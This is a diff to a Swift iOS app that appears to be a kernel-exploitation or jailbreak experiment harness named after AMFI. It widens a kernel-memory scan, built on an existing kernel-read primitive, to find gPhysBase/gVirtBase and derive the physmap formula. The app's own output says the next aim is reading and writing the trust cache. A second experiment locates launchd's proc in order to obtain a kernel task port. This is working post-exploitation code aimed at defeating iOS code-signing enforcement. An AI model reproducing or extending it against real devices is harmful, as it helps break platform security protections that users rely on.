@@ -3715,12 +3715,12 @@ struct AMFIExperimentView: View {
         detail += "\n=== Scanning __DATA_CONST for gPhysBase/gVirtBase ===\n"
         detail += "__DATA_CONST (slid): 0x\(String(format: "%llx", dataConstStart))\n\n"
         
-        // Scan first 0x1000 bytes (4KB) — globals are near the start
+        // Scan first 0x10000 bytes (64KB) — globals might be deeper in section
         var foundPhysBase: UInt64 = 0
         var foundVirtBase: UInt64 = 0
         var scanCount = 0
         
-        for off in stride(from: UInt64(0), to: UInt64(0x1000), by: 8) {
+        for off in stride(from: UInt64(0), to: UInt64(0x10000), by: 8) {
             let val = ds_kread64_safe(dataConstStart + off)
             scanCount += 1
             
@@ -3771,8 +3771,53 @@ struct AMFIExperimentView: View {
                 detail += "Next: find trust cache physical address → read/write via physmap!\n"
             }
         } else {
-            detail += "Not found in first 4KB of __DATA_CONST (\(scanCount) reads)\n"
-            detail += "Try expanding scan range or check __DATA_CONST.__const section offset\n"
+            detail += "Not found in first 64KB of __DATA_CONST (\(scanCount) reads)\n"
+            detail += "Trying broader scan (full __DATA_CONST, 64-byte stride)...\n\n"
+            
+            // Broader scan: entire __DATA_CONST (0x490000 = 4.5MB) with 64-byte stride
+            let dataConstSize: UInt64 = 0x490000
+            for off in stride(from: UInt64(0x10000), to: dataConstSize, by: 64) {
+                let val = ds_kread64_safe(dataConstStart + off)
+                scanCount += 1
+                
+                if val >= 0x800000000 && val <= 0x900000000 && (val & 0xFFF) == 0 {
+                    let nextVal = ds_kread64_safe(dataConstStart + off + 8)
+                    if nextVal > 0xffffffde00000000 && nextVal < 0xffffffe500000000 && (nextVal & 0xFFF) == 0 {
+                        foundPhysBase = val
+                        foundVirtBase = nextVal
+                        detail += "🎯 FOUND at __DATA_CONST+0x\(String(format: "%llx", off))!\n"
+                        detail += "   gPhysBase = 0x\(String(format: "%llx", val))\n"
+                        detail += "   gVirtBase = 0x\(String(format: "%llx", nextVal))\n"
+                        break
+                    }
+                }
+                
+                if val > 0xffffffde00000000 && val < 0xffffffe500000000 && (val & 0xFFF) == 0 {
+                    let nextVal = ds_kread64_safe(dataConstStart + off + 8)
+                    if nextVal >= 0x800000000 && nextVal <= 0x900000000 && (nextVal & 0xFFF) == 0 {
+                        foundVirtBase = val
+                        foundPhysBase = nextVal
+                        detail += "🎯 FOUND (reversed) at __DATA_CONST+0x\(String(format: "%llx", off))!\n"
+                        detail += "   gVirtBase = 0x\(String(format: "%llx", val))\n"
+                        detail += "   gPhysBase = 0x\(String(format: "%llx", nextVal))\n"
+                        break
+                    }
+                }
+                
+                // Limit to prevent timeout (64-byte stride over 4.5MB = ~72K reads max)
+                if scanCount > 20000 {
+                    detail += "Broad scan limit: \(scanCount) reads, offset 0x\(String(format: "%llx", off))\n"
+                    break
+                }
+            }
+            
+            if foundPhysBase != 0 && foundVirtBase != 0 {
+                detail += "\n🎉🎉🎉 PHYSMAP FORMULA DISCOVERED! 🎉🎉🎉\n"
+                detail += "phystokv(pa) = 0x\(String(format: "%llx", foundVirtBase)) + (pa - 0x\(String(format: "%llx", foundPhysBase)))\n\n"
+            } else {
+                detail += "Still not found after \(scanCount) total reads\n"
+                detail += "gPhysBase/gVirtBase might be in different section or format\n"
+            }
         }
         
         let success = foundPhysBase != 0 && foundVirtBase != 0
@@ -3976,45 +4021,14 @@ struct AMFIExperimentView: View {
         var detail = "Experiment 76: Kernel Task Port via IPC Traverse\n"
         detail += "==================================================\n\n"
         
-        // Step 1: Find launchd's task struct
-        // We know launchd is PID 1. Find its proc via allproc list.
+        // Step 1: Find launchd's proc using existing procbypid() function
         let ourProc = ds_get_our_proc()
         detail += "Our proc: 0x\(String(format: "%llx", ourProc))\n"
         
-        // Walk allproc list to find PID 1
-        var launchdProc: UInt64 = 0
-        var currentProc = ourProc
-        
-        for _ in 0..<256 {
-            let pid = ds_kread32(currentProc + UInt64(off_proc_p_pid))
-            if pid == 1 {
-                launchdProc = currentProc
-                break
-            }
-            // Next proc in list
-            let next = ds_kread64_safe(currentProc + UInt64(off_proc_p_list_le_next))
-            if next == 0 || next == currentProc { break }
-            currentProc = next
-        }
-        
-        if launchdProc == 0 {
-            // Try backwards
-            currentProc = ourProc
-            for _ in 0..<256 {
-                let prev = ds_kread64_safe(currentProc + UInt64(off_proc_p_list_le_prev))
-                if prev == 0 || prev == currentProc { break }
-                currentProc = prev
-                let pid = ds_kread32(currentProc + UInt64(off_proc_p_pid))
-                if pid == 1 {
-                    launchdProc = currentProc
-                    break
-                }
-            }
-        }
+        let launchdProc = procbypid(1)
         
         guard launchdProc != 0 else {
-            detail += "❌ Could not find launchd proc (PID 1)\n"
-            detail += "Trying known offset from our proc...\n"
+            detail += "❌ procbypid(1) returned 0 — launchd not found\n"
             return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
         }
         
